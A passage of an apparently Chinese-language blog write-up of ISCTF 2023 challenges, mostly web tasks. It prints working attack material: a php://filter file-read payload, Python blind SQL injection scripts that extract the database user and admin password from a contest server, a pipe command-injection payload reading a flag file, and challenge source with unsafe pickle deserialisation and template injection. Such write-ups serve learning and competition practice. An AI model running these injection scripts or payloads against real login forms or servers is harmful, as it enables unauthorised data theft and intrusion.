class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-params">intArr</span>) &#123;<br>  <span class="hljs-keyword">let</span> str = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; intArr.<span class="hljs-property">length</span>; i += <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">const</span> partA = intArr[i];<br>    <span class="hljs-keyword">const</span> partB = intArr[i + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">const</span> charcode = (partA * <span class="hljs-number">26</span>) + partB;<br>    <span class="hljs-keyword">const</span> char = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(charcode);<br><br>    str += char;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> str;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">text_to_int_array</span>(<span class="hljs-params">txt</span>) &#123;<br>  <span class="hljs-keyword">let</span> int_array = [];<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; txt.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">const</span> charcode = txt.<span class="hljs-title function_">charCodeAt</span>(i) - <span class="hljs-number">97</span>;<br>    int_array.<span class="hljs-title function_">push</span>(charcode);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> int_array;<br>&#125;<br><span class="hljs-keyword">const</span> hash = <span class="hljs-string">&quot;dxdydxdudxdtdxeadxekdxea&quot;</span>;<br><span class="hljs-keyword">const</span> flag = <span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-title function_">text_to_int_array</span>(<span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-title function_">text_to_int_array</span>(hash))))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag);<br><br>#mihoyo<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?mihoyo=<span class="hljs-attr">php</span>:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="1z-Ssql"><a href="#1z-Ssql" class="headerlink" title="1z_Ssql"></a><strong>1z_Ssql</strong></h3><p>fuzz一下<br>过滤了：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">for<br>where<br>+<br>=<br>like<br>union<br>sleep<br>sys<br>innodb<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">admin&#x27; <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database()) &gt; <span class="hljs-number">5</span> <span class="hljs-comment">-- </span><br><span class="hljs-comment">---&gt; 库名长度为6</span><br></code></pre></td></tr></table></figure><p>判断正确的回显好像是</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">You are so smart! <span class="hljs-keyword">Let</span> <span class="hljs-keyword">me</span> give you a hint ↓ <span class="hljs-number">5</span>aSn5L2s77yM5L2g6L+Z5LmI6IGq5piO5bqU6K+l5LiN6ZyA6KaBaGludOWQpz8=<br></code></pre></td></tr></table></figure><p>源码里有sm4.js<br><img src="/mdimg/isctf2023/4.png"><br>base解码<br><img src="/mdimg/isctf2023/5.png"><br>6<br>继续盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://43.249.195.138:22521/&#x27;</span><br><span class="hljs-comment"># table=&quot;-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#for x in range(1,7):</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        data=&#123;<br>            <span class="hljs-comment">#  &quot;username&quot;:&quot;admin&#x27; and ascii(substr(database(),&#123;&#125;,&#123;&#125;)) &gt; &#123;&#125;  -- &quot;.format(x,x,i),</span><br>            <span class="hljs-comment">#version()</span><br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27; and ascii(substr(user(),&#123;&#125;,&#123;&#125;)) &gt; &#123;&#125;  -- &quot;</span>.<span class="hljs-built_in">format</span>(x,x,i),<br>            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;submit&quot;</span>:<span class="hljs-string">&quot;登录&quot;</span><br>        &#125;<br>        r=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are so smart!&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i))<br>            flag+=<span class="hljs-built_in">chr</span>(i)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#bthcls</span><br><span class="hljs-comment">#root@localhost</span><br><span class="hljs-comment">#10.6.14-MariaD</span><br></code></pre></td></tr></table></figure><p>接下来要爆表</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ban了 </span>information_schema.tables  <br>可以用sys.<span class="hljs-keyword">schema_auto_increment_columns </span>  或者 sys.<span class="hljs-keyword">schema_table_statistics_with_buffer </span> 或者 sys.x$<span class="hljs-keyword">schema_flattened_keys</span><br><span class="hljs-keyword"></span>绕过(mysql5.<span class="hljs-number">7</span>+)   但是 sys也<span class="hljs-keyword">ban了</span><br><span class="hljs-keyword"></span>或者 mysql.innodb_table_stats  innodb也被<span class="hljs-keyword">ban了</span><br></code></pre></td></tr></table></figure><p>给了两个附件，猜测一个是表名一个是列名<br>爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>table1 = []<br>table2 = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./some name1.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>    line1 = f1.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line1:<br>        table1.append(i.strip())<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./some name2.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f2:<br>    line2 = f2.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line2:<br>        table2.append(i.strip())<br>url = <span class="hljs-string">&#x27;http://43.249.195.138:21759/&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table1:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table2:<br>            payload= <span class="hljs-string">&quot;admin&#x27; and ascii(substr((select group_concat(&#123;&#125;) from bthcls.&#123;&#125;),1,1)) &gt; 0 -- &quot;</span>.<span class="hljs-built_in">format</span>(j,i)<br>            data= &#123;<br>                <span class="hljs-string">&quot;username&quot;</span>:payload,<br>                <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span><br>            &#125;<br>            r=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hint&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table&quot;</span>,i,<span class="hljs-string">&quot;columns&quot;</span>,j)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">table users columns password</span><br><span class="hljs-string">table users columns user</span><br><span class="hljs-string">table users columns username</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>开始盲注数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://43.249.195.138:21759/&#x27;</span><br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">130</span><br>    mid = (high+low)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low &lt; high):<br>        payload = <span class="hljs-string">&quot;admin&#x27; and ascii(substr((select group_concat(username,password) from bthcls.users),&#123;&#125;,1)) &gt; &#123;&#125; -- &quot;</span> .<span class="hljs-built_in">format</span>(i,mid)<br>        data = &#123;<br>                <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>                <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>            &#125;<br>        r = requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hint&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(mid) == <span class="hljs-string">&#x27; &#x27;</span>):<br>        <span class="hljs-keyword">break</span><br>    res  = res + <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-comment">#admin  we1come7o1sctf</span><br></code></pre></td></tr></table></figure><p>登录即可</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz!"></a><strong>fuzz!</strong></h3><p>fuzz一下 中括号[]没ban [f] 匹配f | 管道符拼接命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的</span><br><span class="hljs-comment">知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;你需要fuzz一下哦~&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fi|le|flag/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;curl &#x27;</span>.<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=|cat /[f]laggggggg.txt<br></code></pre></td></tr></table></figure><h3 id="恐怖G7人-赛后出）"><a href="#恐怖G7人-赛后出）" class="headerlink" title="恐怖G7人 (赛后出）"></a><strong>恐怖G7人 (赛后出）</strong></h3><p>看这个cookie能pickle.load 以为是pickle反序列化 （怒<br>其实是ssti<br>fenjing就出了<br><img src="/mdimg/isctf2023/6.png"><br>app.py</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>猪王峡谷 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>了解这片土地，发现自身优势，然后纵身一跃<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>芜湖~这可真带劲<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这场战斗并非势均力敌，有多位大厨在做饭<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are the ISCTF champion,flag in /champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>重伤倒地<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>from flask import Flask<br>      from flask import request<br>      from flask import config<br>      from flask import session<br>      from flask import make_response<br>      from flask import render_template_string<br>      from waf import waf<br>      import base64<br>      import pickle<br><br>      app = Flask(__name__)<br><br>      @app.route(&quot;/&quot;)<br>      def Hello():<br>      html = &#x27;&#x27;&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome ISCTF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello CTFer,Welcome to ISCTF 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>了解你的撼胃者<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;&#123;url_for(</span>&quot;<span class="hljs-attr">static</span>&quot;,<span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/img/1.jpg&quot;</span>)&#125;&#125;&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>你知道我什么成分，来找我吧<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/zhuwangxiagu&quot;</span>&gt;</span> 前往猪王峡谷<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>&#x27;&#x27;&#x27;<br>      return render_template_string(html)<br><br>      @app.route(&quot;/zhuwangxiagu&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>      def pig():<br>      html = &#x27;&#x27;&#x27;<br>      <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>猪王峡谷 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/game&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>选择你的角色<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;char&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;林肯死大头！&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>      &#x27;&#x27;&#x27;<br>      return html<br><br>      @app.route(&quot;/game&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>      def game():<br>      name = request.form.get(&#x27;char&#x27;)<br>      # print(request.form)<br>      if name is None:<br>      name = &quot;undefined&quot;<br><br>      html = f&#x27;&#x27;&#x27;<br>      <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>猪王峡谷 排位赛联盟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>了解这片土地，发现自身优势，然后纵身一跃<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>芜湖~这可真带劲<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这场战斗并非势均力敌，有多位大厨在做饭<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are the ISCTF champion,flag in /champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>重伤倒地<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>&#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>动力牛子<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>      &#x27;&#x27;&#x27;<br>      user = base64.b64encode(pickle.dumps(&#123;&quot;name&quot;:name,&quot;is_champion&quot;:0&#125;))<br>      resp = make_response(render_template_string(html))<br>      resp.set_cookie(&#x27;userInfo&#x27;, user)<br>      return resp<br><br>      @app.route(&quot;/champion&quot;)<br>      def getflag():<br>      userInfoCookies = request.cookies.get(&#x27;userInfo&#x27;)<br>      if userInfoCookies is None:<br>      return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Bad Request<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,400<br>      user = base64.b64decode(userInfoCookies)<br>      if not waf(user):<br>      return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden a<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,403<br>      user = pickle.loads(user)<br>      if (champion := user.get(&quot;is_champion&quot;) is None) or (username := user.get(&quot;name&quot;) is None):<br>      return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are Not TruE champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,401<br>        if champion != 1:<br>                return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are Not TruE champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,401<br>        else:<br>                return f&quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome champion: &#123;name&#125;,But flag in f1__A_g.txt, Get it!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;<br><br>app.run(host=&quot;0.0.0.0&quot;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>动力牛子<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>源码一个类都没有，就为了一个cookie 就导一个pickle really逆天</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h3 id="ezUSB"><a href="#ezUSB" class="headerlink" title="**ezUSB **"></a>**ezUSB **</h3><p>原汤化原食<br>套神工具秒套神的题<br><img src="/mdimg/isctf2023/7.png"><br><img src="/mdimg/isctf2023/8.png"><br><img 